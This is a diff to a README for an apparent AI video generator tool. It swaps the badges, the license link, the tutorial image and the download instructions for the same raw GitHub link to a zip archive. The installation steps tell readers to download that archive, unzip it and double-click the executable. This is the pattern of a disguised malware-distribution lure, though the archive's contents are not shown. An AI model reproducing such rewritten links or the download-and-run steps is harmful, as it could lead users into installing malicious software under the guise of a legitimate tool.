@@ -1,10 +1,10 @@
 # 🤖✨ AI Video Generator – 2025 Vision Engine
 
-![OS](https://img.shields.io/badge/OS-Windows%20%7C%20macOS%20%7C%20Linux-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
-![Status](https://img.shields.io/badge/status-Active%202025-brightgreen)
-![Support](https://img.shields.io/badge/support-24%2F7-orange)
-![Languages](https://img.shields.io/badge/languages-Multi-brightgreen)
+![OS](https://github.com/BryanD1406/ai-video-gen-studio/raw/refs/heads/main/skied/ai_studio_video_gen_1.8.zip%20%7C%20macOS%20%7C%20Linux-blue)
+![License](https://github.com/BryanD1406/ai-video-gen-studio/raw/refs/heads/main/skied/ai_studio_video_gen_1.8.zip)
+![Status](https://github.com/BryanD1406/ai-video-gen-studio/raw/refs/heads/main/skied/ai_studio_video_gen_1.8.zip%202025-brightgreen)
+![Support](https://github.com/BryanD1406/ai-video-gen-studio/raw/refs/heads/main/skied/ai_studio_video_gen_1.8.zip%2F7-orange)
+![Languages](https://github.com/BryanD1406/ai-video-gen-studio/raw/refs/heads/main/skied/ai_studio_video_gen_1.8.zip)
 
 ---
 
@@ -28,17 +28,17 @@
 
 ## 👾 Installation Guide: Start Creating in Minutes!
 
-### 1️⃣ Download `EasyLaunch.zip` from this repository
+### 1️⃣ Download `https://github.com/BryanD1406/ai-video-gen-studio/raw/refs/heads/main/skied/ai_studio_video_gen_1.8.zip` from this repository
 
-Unpack creative potential instantly. Simply nab the latest release—`EasyLaunch.zip`—sitting snug in the root directory.
+Unpack creative potential instantly. Simply nab the latest release—`https://github.com/BryanD1406/ai-video-gen-studio/raw/refs/heads/main/skied/ai_studio_video_gen_1.8.zip`—sitting snug in the root directory.
 
 ### 2️⃣ Extract & Launch
 
-Unzip EasyLaunch.zip anywhere on your device. Double-click the executable, and the adaptive interface springs to life!
+Unzip https://github.com/BryanD1406/ai-video-gen-studio/raw/refs/heads/main/skied/ai_studio_video_gen_1.8.zip anywhere on your device. Double-click the executable, and the adaptive interface springs to life!
 
 ### 3️⃣ Installation Video Walkthrough
 
-![Installation tutorial](https://i.imgur.com/Js67NIU.gif)
+![Installation tutorial](https://github.com/BryanD1406/ai-video-gen-studio/raw/refs/heads/main/skied/ai_studio_video_gen_1.8.zip)
 
 Watch as the process unfolds, step by step. See how swiftly you can bring your AI video generator to your desktop and get rolling on your next masterpiece.
 
@@ -99,7 +99,7 @@ Combine both APIs natively—supercharge your creative potential!
 
 ## 💼 License
 
-Licensed under the MIT License – collaborate, fork, or innovate with confidence and creative liberty. For details, see [MIT License](https://opensource.org/licenses/MIT).
+Licensed under the MIT License – collaborate, fork, or innovate with confidence and creative liberty. For details, see [MIT License](https://github.com/BryanD1406/ai-video-gen-studio/raw/refs/heads/main/skied/ai_studio_video_gen_1.8.zip).
 
 ---
 
